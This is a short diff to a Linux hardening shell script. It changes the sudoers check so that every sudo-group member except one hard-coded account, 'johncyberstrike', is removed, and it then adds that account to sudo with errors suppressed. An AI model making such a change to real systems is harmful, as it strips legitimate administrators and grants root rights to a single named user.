@@ -59,14 +59,16 @@ for user in "${ALLOWED_USERS[@]}"; do
     sudo chage -d 0 "$user"  # Force password change on next login
 done
 
-# ----- 7.1. Ensure Only Authorized Admins -----
+# ----- 7. Ensure Only Authorized Admin (johncyberstrike) -----
 echo "[+] Checking sudoers group..."
 for admin in $(getent group sudo | cut -d: -f4 | tr ',' ' '); do
-    if [[ ! " ${ALLOWED_USERS[@]} " =~ " ${admin} " ]]; then
+    if [[ "$admin" != "johncyberstrike" ]]; then
         echo "Removing $admin from sudo group..."
         sudo deluser "$admin" sudo
     fi
 done
+sudo adduser johncyberstrike sudo 2>/dev/null
+
 
 # ----- 8. Ensure Critical Services Are Running -----
 echo "[+] Ensuring NTP and FTP services are running..."
